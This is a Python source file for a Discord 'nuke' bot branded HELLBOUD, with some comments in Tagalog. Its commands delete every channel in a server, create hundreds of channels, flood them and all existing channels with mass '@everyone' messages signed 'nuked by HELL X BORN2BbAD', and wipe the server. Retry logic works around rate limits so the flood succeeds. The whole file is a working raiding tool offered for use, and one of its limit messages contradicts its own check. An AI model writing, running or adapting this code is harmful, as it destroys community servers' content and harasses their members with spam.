

import asyncio
import discord
from discord.ext import commands
import random
import time
import json
import os
BANNER = r"""
██╗  ██╗███████╗██╗     ██╗
██║  ██║██╔════╝██║     ██║
███████║█████╗  ██║     ██║
██╔══██║██╔══╝  ██║     ██║
██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

========================================
            HELLBOUD 
========================================
"""

print(BANNER)
input("Press Enter to continue...")
# --- CONFIGURE THESE ---

BOT_TOKEN = "YOUR_BOT_TOKEN_HERE" 
PREFIX = "."  # Command prefix

# Nuke / Spam Configuration
CHANNEL_NAME = "Lipat Na Po "
MESSAGE = "@everyone @here nuked by HELL X BORN2BbAD"
AMOUNT_OF_CHANNELS = 400
AMOUNT_OF_MESSAGES = 10000
BACKUP_FILE = "server_backup.json"

# Random channel name variations
RANDOM_CHANNEL_NAMES = ["hell", "hell", "hell", "hell", "hell", "hell", "hell"]
USE_RANDOM_NAMES = True  

# -----------------------
# ENGINE CODE - DO NOT MODIFY
# -----------------------a

def get_channel_name():
    if USE_RANDOM_NAMES and RANDOM_CHANNEL_NAMES:
        return random.choice(RANDOM_CHANNEL_NAMES)
    return CHANNEL_NAME

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

async def fire_and_forget(channel, message):
    """Bato lang nang bato ng chat sa channel nang hindi nag-aantay ng API reply"""
    try:
        await channel.send(message)
    except:
        pass

async def channel_worker(guild, channel_name, message, msg_count):
    try:
        channel = await guild.create_text_channel(name=channel_name)
        for _ in range(msg_count):
            try:
                await channel.send(message)
                await asyncio.sleep(0.01)
            except discord.errors.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(e.retry_after)
                    try: await channel.send(message)
                    except: pass
                else:
                    break
            except:
                break
    except:
        pass

async def nuke_server(guild: discord.Guild):
    print(f"Starting SYNCHRONIZED FLOOD on {guild.name}")
    start_time = time.perf_counter()

    await asyncio.gather(*(channel.delete() for channel in guild.channels), return_exceptions=True)

    msg_per_channel = max(5, AMOUNT_OF_MESSAGES // AMOUNT_OF_CHANNELS)

    tasks = []
    for _ in range(AMOUNT_OF_CHANNELS):
        tasks.append(channel_worker(guild, get_channel_name(), MESSAGE, msg_per_channel))
        
    chunk_size = 15
    for i in range(0, len(tasks), chunk_size):
        await asyncio.gather(*tasks[i:i+chunk_size], return_exceptions=True)
        await asyncio.sleep(0.05)

    print(f"Nuke and simultaneous spam completed in {time.perf_counter() - start_time:.2f} seconds!")

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}\nPrefix: {PREFIX}")
    print(f"Commands:\n  {PREFIX}nuke       - Gawa at spam ng mga bagong channel\n  {PREFIX}spamall    - I-spam lahat ng kasalukuyang channels (Walang delete)\n  {PREFIX}deleteall  - Wipeout ng lahat ng channels\n  {PREFIX}backup     - I-save ang ayos ng server bago i-nuke\n  {PREFIX}restore    - I-auto-generate ulit ang server layout\n" + "="*50)

@bot.command(name="nuke")
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("❌ Admin permission required!")
    await ctx.send("👿 Executing brutal synchronized channel creation and spam...")
    await nuke_server(ctx.guild)

# --- : SPAM ALL EXISTING CHANNELS ---
@bot.command(name="spamall")
async def spamall(ctx):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("❌ Admin permission required!")

    # 
    text_channels = [c for c in ctx.guild.channels if isinstance(c, discord.TextChannel)]
    
    if not text_channels:
        return await ctx.send("❌ Walang mahanap na text channels!")

    await ctx.send("🔥 Launching global background spam across all channels...")
    print(f"[SpamAll] Flooding {len(text_channels)} existing channels simultaneously...")

    # 
    for i in range(AMOUNT_OF_MESSAGES):
        channel = text_channels[i % len(text_channels)]
        asyncio.create_task(fire_and_forget(channel, MESSAGE))
        
        #
        if i % 15 == 0:
            await asyncio.sleep(0.001)

# --- PURGE / DELETE ALL CHANNELS ONLY ---
@bot.command(name="deleteall")
async def deleteall(ctx):
    if not ctx.author.guild_permissions.administrator:
        return await ctx.send("❌ Admin permission required!")
        
    print(f"[Wipe] Deleting all channels in {ctx.guild.name}...")
    start_time = time.perf_counter()
    
    await asyncio.gather(*(channel.delete() for channel in ctx.guild.channels), return_exceptions=True)
    
    try: await ctx.guild.create_text_channel(name="wiped-out")
    except: pass
        
    print(f"[Success] All channels deleted in {time.perf_counter() - start_time:.2f} seconds!")

# --- BACKUP SYSTEM ---
@bot.command(name="backup")
async def backup(ctx):
    if not ctx.author.guild_permissions.administrator: return
    
    backup_data = {"channels": []}
    for channel in ctx.guild.channels:
        ch_type = "category" if isinstance(channel, discord.CategoryChannel) else "voice" if isinstance(channel, discord.VoiceChannel) else "text"
        backup_data["channels"].append({
            "name": channel.name,
            "type": ch_type,
            "parent_name": channel.category.name if channel.category else None
        })

    with open(BACKUP_FILE, 'w', encoding='utf-8') as f:
        json.dump(backup_data, f, indent=4, ensure_ascii=False)
    await ctx.send("✅ Layout saved! Ready to restore anytime.")

@bot.command(name="restore")
async def restore(ctx):
    if not ctx.author.guild_permissions.administrator: return
    if not os.path.exists(BACKUP_FILE):
        return await ctx.send("❌ No backup file found! Use !backup first.")

    await ctx.send("🔄 Restoring server layout at maximum speed...")
    start_time = time.perf_counter()

    with open(BACKUP_FILE, 'r', encoding='utf-8') as f:
        backup_data = json.load(f)

    await asyncio.gather(*(channel.delete() for channel in ctx.guild.channels), return_exceptions=True)

    cat_data = [ch for ch in backup_data["channels"] if ch["type"] == "category"]
    cat_tasks = [ctx.guild.create_category(name=c["name"]) for c in cat_data]
    created_cats = await asyncio.gather(*cat_tasks, return_exceptions=True)
    
    category_map = {cat.name: cat for cat in created_cats if isinstance(cat, discord.CategoryChannel)}

    semaphore = asyncio.Semaphore(50)
    async def safe_create_chan(ch, target_cat):
        async with semaphore:
            try:
                if ch["type"] == "text":
                    await ctx.guild.create_text_channel(name=ch["name"], category=target_cat)
                elif ch["type"] == "voice":
                    await ctx.guild.create_voice_channel(name=ch["name"], category=target_cat)
            except:
                pass

    chan_tasks = []
    for ch in backup_data["channels"]:
        if ch["type"] == "category": continue
        target_cat = category_map.get(ch["parent_name"]) if ch["parent_name"] else None
        chan_tasks.append(safe_create_chan(ch, target_cat))

    await asyncio.gather(*chan_tasks, return_exceptions=True)
    print(f"[Success] Server regenerated in {time.perf_counter() - start_time:.2f} seconds!")

@bot.command(name="config")
async def config(ctx):
    await ctx.send(f"**Config:**\nName: `{CHANNEL_NAME}`\nChannels: `{AMOUNT_OF_CHANNELS}`\nMessages: `{AMOUNT_OF_MESSAGES}`")
@bot.command()
async def createchannels(ctx, amount: int, name: str):
    if not ctx.author.guild_permissions.manage_channels:
        return await ctx.send("❌ You need Manage Channels permission.")

    # safety limit para hindi abuso
    if amount > 50:
        return await ctx.send("❌ Max 10 channels only.")

    for i in range(amount):
        await ctx.guild.create_text_channel(f"{name}-{i+1}")

    await ctx.send(f"✅ Created {amount} channels.")
if __name__ == "__main__":
    
    bot.run(BOT_TOKEN)